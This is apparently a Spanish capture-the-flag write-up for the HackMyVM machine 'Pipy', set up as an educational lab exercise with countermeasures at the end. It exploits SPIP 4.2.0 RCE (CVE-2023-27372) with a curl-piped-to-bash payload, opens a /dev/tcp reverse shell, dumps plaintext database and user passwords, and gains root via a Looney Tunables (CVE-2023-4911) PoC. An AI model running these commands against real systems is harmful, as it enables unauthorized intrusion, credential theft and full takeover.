# Máquina Pipy - HackMyVM

**Plataforma:** [Máquina Pipy](https://hackmyvm.eu/machines/machine.php?vm=Pipy)  
**Dificultad:** Media  
**SO:** Linux (Ubuntu 22.04.3 LTS)  
**Autor del reto:** ruycr4ft  
**Técnicas:** RCE (CVE-2023-27372), Enumeración HTTP, Reverse Shell, Escalada de privilegios (CVE-2023-4911)

---

## Índice

1. [Configuración del laboratorio](#1-configuración-del-laboratorio)
2. [Reconocimiento — Escaneo de red](#2-reconocimiento--escaneo-de-red)
3. [Enumeración de servicios](#3-enumeración-de-servicios)
   - [SSH](#ssh)
   - [HTTP](#http)
4. [Análisis de vulnerabilidades](#4-análisis-de-vulnerabilidades)
   - [Métodos HTTP permitidos](#métodos-http-permitidos)
   - [Enumeración de directorios (Fuzzing)](#enumeración-de-directorios-fuzzing)
   - [CVE-2023-27372 — SPIP RCE](#cve-2023-27372--spip-rce)
5. [Explotación — Reverse Shell](#5-explotación--reverse-shell)
6. [Post-explotación](#6-post-explotación)
   - [Estabilización de la shell](#estabilización-de-la-shell)
   - [Enumeración interna y acceso a Angela](#enumeración-interna-y-acceso-a-angela)
7. [Escalada de privilegios — CVE-2023-4911 (Looney Tunables)](#7-escalada-de-privilegios--cve-2023-4911-looney-tunables)
8. [Resumen de vulnerabilidades](#8-resumen-de-vulnerabilidades)

---

## 1. Configuración del laboratorio

El laboratorio se ha montado en **VirtualBox** con la siguiente topología:

```
Red NAT: 192.168.100.0/24 (con DHCP)
├── Kali Linux (atacante) → IP estática: 192.168.100.250/24
└── Pipy (objetivo)       → IP dinámica: 192.168.100.6/24
```

---

## 2. Reconocimiento — Escaneo de red

### Ping Scan — Descubrimiento de hosts

Primero identificamos qué máquinas están activas en la red con un *ping scan*:

```bash
sudo nmap -n -sn 192.168.100.0/24
```

**Salida relevante:**

```
Starting Nmap 7.98 ( https://nmap.org ) at 2026-04-09 06:20 +0200
Nmap scan report for 192.168.100.1
Host is up (0.00036s latency).
MAC Address: 52:54:00:12:35:00 (QEMU virtual NIC)
Nmap scan report for 192.168.100.2
Host is up (0.00024s latency).
MAC Address: 52:54:00:12:35:00 (QEMU virtual NIC)
Nmap scan report for 192.168.100.3
Host is up (0.00044s latency).
MAC Address: 08:00:27:F2:15:FC (Oracle VirtualBox virtual NIC)
Nmap scan report for 192.168.100.6
Host is up (0.00070s latency).
MAC Address: 08:00:27:C2:41:A0 (Oracle VirtualBox virtual NIC)
Nmap scan report for 192.168.100.5
Host is up.
Nmap scan report for 192.168.100.250
Host is up.
Nmap done: 256 IP addresses (6 hosts up) scanned in 2.07 seconds
```

> La IP **192.168.100.6** corresponde a la máquina objetivo Pipy.

---

### Escaneo de puertos — SYN Stealth Scan

Escaneamos todos los puertos de forma sigilosa para no generar ruido innecesario:

```bash
sudo nmap -n -Pn -sS -p- 192.168.100.6
```

| Parámetro | Descripción |
|-----------|-------------|
| `-Pn`     | Omite el ping previo (asume host activo) |
| `-sS`     | TCP SYN scan (stealth): envía SYN, recibe SYN/ACK, corta con RST sin completar el handshake |
| `-p-`     | Escanea todos los puertos del 1 al 65535 |

**Salida:**

```
Starting Nmap 7.98 ( https://nmap.org ) at 2026-04-09 07:18 +0200
Nmap scan report for 192.168.100.6
Host is up (0.00046s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
MAC Address: 08:00:27:C2:41:A0 (Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 18.79 seconds
```

Puertos abiertos: **22/tcp (SSH)** y **80/tcp (HTTP)**.

---

## 3. Enumeración de servicios

Lanzamos un escaneo más completo para detectar versiones, scripts y sistema operativo:

```bash
sudo nmap -n -Pn -sV -sC -O -p 22,80 192.168.100.6
```

| Parámetro | Descripción |
|-----------|-------------|
| `-sV`     | Detección de versión del servicio |
| `-sC`     | Ejecuta scripts NSE por defecto |
| `-O`      | Detección de sistema operativo |
| `-p 22,80`| Solo los puertos descubiertos |

**Salida:**

```
Starting Nmap 7.98 ( https://nmap.org ) at 2026-04-09 07:36 +0200
Nmap scan report for 192.168.100.6
Host is up (0.00071s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 c0:f6:a1:6a:53:72:be:8d:c2:34:11:e7:e4:9c:94:75 (ECDSA)
|_  256 32:1c:f5:df:16:c7:c1:99:2c:d6:26:93:5a:43:57:59 (ED25519)
80/tcp open  http    Apache httpd 2.4.52 ((Ubuntu))
|_http-generator: SPIP 4.2.0
|_http-title: Mi sitio SPIP
|_http-server-header: Apache/2.4.52 (Ubuntu)
MAC Address: 08:00:27:C2:41:A0 (Oracle VirtualBox virtual NIC)
Device type: general purpose
Running: Linux 4.X|5.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
OS details: Linux 4.15 - 5.19
Network Distance: 1 hop
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

**Información obtenida:**
- SSH: OpenSSH 8.9p1 Ubuntu
- HTTP: Apache 2.4.52 con **SPIP 4.2.0**
- OS: Linux 4.15 – 5.19

---

### SSH

Comprobamos los métodos de autenticación habilitados en el SSH:

```bash
sudo nmap -n -Pn -p 22 --script ssh-auth-methods 192.168.100.6
```

El script revela que se permiten tanto autenticación por **contraseña** como por **clave pública**, lo que abre la puerta a ataques de fuerza bruta.

---

### HTTP

Obtenemos las cabeceras HTTP con `curl` para confirmar las tecnologías del servidor:

```bash
curl -I http://192.168.100.6
```

**Salida:**

```
HTTP/1.1 200 OK
Date: Thu, 09 Apr 2026 06:49:08 GMT
Server: Apache/2.4.52 (Ubuntu)
Vary: Cookie,Accept-Encoding
Composed-By: SPIP 4.2.0 @ www.spip.net + http://192.168.100.6/local/config.txt
X-Spip-Cache: 86400
Last-Modified: Thu, 09 Apr 2026 06:49:08 GMT
Connection: close
Content-Type: text/html; charset=utf-8
```

También con `whatweb` para enumeración más detallada:

```bash
whatweb -v 192.168.100.6
```

**Salida:**

```
WhatWeb report for http://192.168.100.6
Status    : 200 OK
Title     : Mi sitio SPIP
IP        : 192.168.100.6
Country   : RESERVED, ZZ

Summary   : Apache[2.4.52], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.52 (Ubuntu)],
JQuery, MetaGenerator[SPIP 4.2.0], Script[text/javascript], SPIP[4.2.0][http://192.168.100.6/local/config.txt], UncommonHeaders[composed-by,x-spip-cache]
```

> El servidor ejecuta el CMS **SPIP versión 4.2.0** sobre PHP.

---

## 4. Análisis de vulnerabilidades

### Métodos HTTP permitidos

Verificamos si el servidor acepta métodos peligrosos como `PUT` o `DELETE`:

```bash
sudo nmap -n -Pn -p 80 --script http-methods 192.168.100.6
```

**Métodos permitidos en Pipy:** `GET`, `HEAD`, `POST`, `OPTIONS`

> `PUT` y `DELETE` están deshabilitados, por lo que no podemos subir archivos directamente vía HTTP.

---

### Enumeración de directorios (Fuzzing)

Instalamos SecLists y usamos `ffuf` para descubrir rutas ocultas:

```bash
sudo apt update && sudo apt install -y seclists
cp -pv /usr/share/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt /tmp
ffuf -u http://192.168.100.6/FUZZ -w /tmp/DirBuster-2007_directory-list-2.3-medium.txt -e .php,.html,.txt -ic
```

| Parámetro | Descripción |
|-----------|-------------|
| `-u ... /FUZZ` | URL con el marcador de posición a reemplazar |
| `-w`           | Wordlist a utilizar |
| `-e .php,.html,.txt` | Extensiones a probar además de directorios |
| `-ic`          | Ignora líneas comentadas del wordlist |

**Resultados destacados (882.184 peticiones):**

```
.php                [Status: 403, Size: 278]
.html               [Status: 403, Size: 278]
index.php           [Status: 200, Size: 7519]
local               [Status: 301, Size: 314]
javascript          [Status: 301, Size: 319]
vendor              [Status: 301, Size: 315]
config              [Status: 301, Size: 315]
tmp                 [Status: 301, Size: 312]
LICENSE             [Status: 200, Size: 35147]
IMG                 [Status: 301, Size: 315]
spip.php            [Status: 200, Size: 7518]
htaccess.txt        [Status: 200, Size: 4307]
ecrire              [Status: 301, Size: 315]
prive               [Status: 301, Size: 314]
server-status       [Status: 403, Size: 278]
```

---

### CVE-2023-27372 — SPIP RCE

Buscamos vulnerabilidades conocidas para SPIP 4.2.0:

```bash
searchsploit SPIP
```

**Salida:**

```
SPIP v4.2.0 - Remote Code Execution (Unauthenticated)  | php/webapps/51536.py
```

Localizamos el exploit en el sistema:

```bash
sudo updatedb
locate php/webapps/51536.py
cat /usr/share/exploitdb/exploits/php/webapps/51536.py
```

> **CVE-2023-27372** es una vulnerabilidad crítica de tipo **RCE (Remote Code Execution) no autenticado** en SPIP versiones anteriores a 4.2.1. Explota una inyección de código PHP en el parámetro `oubli` del formulario público, permitiendo ejecutar comandos arbitrarios con los privilegios del servidor web sin necesidad de credenciales.

---

## 5. Explotación — Reverse Shell

### Paso 1: Preparar el payload del Reverse Shell

Generamos el script bash de la reverse shell (IP atacante: `192.168.100.250`, puerto: `1331`):

```bash
echo 'bash -c "/bin/bash -i >& /dev/tcp/192.168.100.250/1331 0>&1"' > reverse_pipy.sh
```

### Paso 2: Levantar un servidor HTTP para servir el payload

```bash
python3 -m http.server 8000
```

```
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```

### Paso 3: Ponerse en escucha con netcat

En una **nueva terminal**:

```bash
nc -lvnp 1331
```

```
listening on [any] 1331 ...
```

### Paso 4: Lanzar el exploit

```bash
cat /usr/share/exploitdb/exploits/php/webapps/51536.py > CVE-2023-27372.py
python3 CVE-2023-27372.py -u http://192.168.100.6 -c 'curl http://192.168.100.250:8000/reverse_pipy.sh|bash' -v
```

**Salida del exploit:**

```
[+] Anti-CSRF token found : iYe2q77AjJpzr7DiCN466DffCNPeUp0xMFqKM8HZ2jA5IWNjp6Vhzoioj1CV4d/wM8wzPYKIJAYCiLEY+fBNfgPHcNshG3+b
```

### Resultado: Shell obtenida

En la terminal con netcat recibimos la conexión de la máquina Pipy:

```
connect to [192.168.100.250] from (UNKNOWN) [192.168.100.6] 34418
bash: cannot set terminal process group (840): Inappropriate ioctl for device
bash: no job control in this shell
www-data@pipy:/var/www/html$ whoami
www-data
www-data@pipy:/var/www/html$ ip -c a
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
2: enp0s3: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc fq_codel state UP
    inet 192.168.100.6/24 metric 100 brd 192.168.100.255 scope global dynamic enp0s3
```

> **¡Máquina comprometida!** Tenemos acceso como usuario `www-data`.

---

## 6. Post-explotación

### Estabilización de la shell

La shell obtenida es básica e inestable. La convertimos en una TTY completamente interactiva:

```bash
# En la shell de www-data — generar una PTY con Python
www-data@pipy:/var/www/html$ python3 -c 'import pty; pty.spawn("/bin/bash")'

# Suspender la shell
www-data@pipy:/var/www/html$ ^Z   # Ctrl+Z

# Ver configuración del terminal local
└─$ stty -a

# Pasar la shell a modo raw y reanudar
└─$ stty raw -echo; fg

# Configurar variables de entorno en la shell remota
www-data@pipy:/var/www/html$ export TERM=xterm
www-data@pipy:/var/www/html$ export SHELL=/bin/bash
www-data@pipy:/var/www/html$ stty rows 54 columns 86
```

---

### Enumeración interna y acceso a Angela

#### Identificar usuarios del sistema

```bash
www-data@pipy:/var/www/html$ id
www-data@pipy:/var/www/html$ ls -lh /home
www-data@pipy:/var/www/html$ grep angela /etc/passwd
```

Existe un usuario **angela** con shell activa en el sistema.

#### Credenciales de base de datos en texto plano

```bash
www-data@pipy:/var/www/html$ cat config/connect.php
```

**Contenido del archivo:**

```php
<?php
if (!defined("_ECRIRE_INC_VERSION")) return;
defined('_MYSQL_SET_SQL_MODE') || define('_MYSQL_SET_SQL_MODE',true);
$GLOBALS['spip_connect_version'] = 0.8;
spip_connect_db('localhost','','root','dbpassword','spip','mysql', 'spip','','');
```

> Credenciales de MariaDB en **texto plano**: usuario `root`, contraseña `dbpassword`.

#### Acceso a la base de datos y extracción de credenciales

```bash
www-data@pipy:/var/www/html$ mysql -u root -pdbpassword
```

```sql
MariaDB [(none)]> show databases;
+--------------------+
| Database           |
+--------------------+
| information_schema |
| mysql              |
| performance_schema |
| spip               |
| sys                |
+--------------------+
5 rows in set (0.013 sec)

MariaDB [(none)]> use spip;
MariaDB [spip]> select nom,pass from spip_auteurs;
+---------+------------------------------------------------------------------+
| nom     | pass                                                             |
+---------+------------------------------------------------------------------+
| Angela  | 4ng3l4                                                           |
| admin   | $2y$10$.GR/i2bwnVInUmzdzSi10u66AKUUWGGDBNnA7IuIeZBZVtFMqTsZ2   |
+---------+------------------------------------------------------------------+
2 rows in set (0.000 sec)
```

> Contraseña de Angela encontrada en **texto plano**: `4ng3l4`

#### Acceso SSH como Angela

```bash
ssh angela@192.168.100.6
# Password: 4ng3l4
```

---

## 7. Escalada de privilegios — CVE-2023-4911 (Looney Tunables)

### Identificación del sistema operativo

```bash
angela@pipy:~$ lsb_release -a
```

**Salida:**

```
No LSB modules are available.
Distributor ID: Ubuntu
Description:    Ubuntu 22.04.3 LTS
Release:        22.04
Codename:       jammy
```

### Verificación de vulnerabilidad

Ubuntu 22.04.3 LTS es vulnerable a **CVE-2023-4911** (*Looney Tunables*), un desbordamiento de búfer en el cargador dinámico de GNU C (`ld.so`) al procesar la variable de entorno `GLIBC_TUNABLES`.

Confirmamos la vulnerabilidad:

```bash
angela@pipy:~$ env -i "GLIBC_TUNABLES=glibc.malloc.mxfast=glibc.malloc.mxfast=A" "Z=`printf '%08192x' 1`" /usr/bin/su --help
```

**Salida:**

```
Segmentation fault (core dumped)
```

> El sistema es vulnerable: obtenemos `Segmentation fault`.

### Explotación con PoC pública

```bash
angela@pipy:~$ git clone https://github.com/leesh3288/CVE-2023-4911/
angela@pipy:~$ cd CVE-2023-4911/
angela@pipy:~/CVE-2023-4911$ python3 gen_libc.py
angela@pipy:~/CVE-2023-4911$ gcc -o exp exp.c
angela@pipy:~/CVE-2023-4911$ ./exp
```

**Salida:**

```
try 100
try 200
# id
uid=0(root) gid=0(root) groups=0(root),1000(angela)
# whoami
root
```

> **¡Escalada completada!** Somos `root`.

---

## 8. Resumen de vulnerabilidades

| # | Vulnerabilidad | CVE | Criticidad | Impacto |
|---|---------------|-----|------------|---------|
| 1 | SPIP RCE no autenticado | CVE-2023-27372 | 🔴 Crítica (CVSS 9.8) | Ejecución de código remoto como `www-data` |
| 2 | Credenciales en texto plano | — | 🟠 Alta | Acceso a base de datos y contraseña de usuario del sistema |
| 3 | Looney Tunables (glibc) | CVE-2023-4911 | 🔴 Alta (CVSS 7.8) | Escalada de privilegios a `root` |

---

## Contramedidas recomendadas

1. **Actualizar SPIP** a versión 4.2.1 o superior (parchea CVE-2023-27372).
2. **Nunca almacenar credenciales en texto plano** en archivos de configuración; usar variables de entorno o gestores de secretos.
3. **Actualizar el sistema operativo** para parchear CVE-2023-4911 (`apt upgrade`).
4. **Aplicar el principio de mínimo privilegio** al usuario del servidor web.
5. **Deshabilitar autenticación por contraseña en SSH** y usar exclusivamente claves públicas.

---

## Herramientas utilizadas

| Herramienta | Uso |
|-------------|-----|
| `nmap` | Escaneo de puertos, detección de servicios y OS |
| `curl` | Análisis de cabeceras HTTP |
| `whatweb` | Fingerprinting de tecnologías web |
| `ffuf` | Fuzzing de directorios y archivos |
| `searchsploit` | Búsqueda de exploits públicos |
| `netcat (nc)` | Listener para Reverse Shell |
| `python3` | Servidor HTTP temporal y ejecución del exploit |
| `mysql` | Acceso a base de datos MariaDB |
| `gcc` | Compilación del exploit de escalada de privilegios |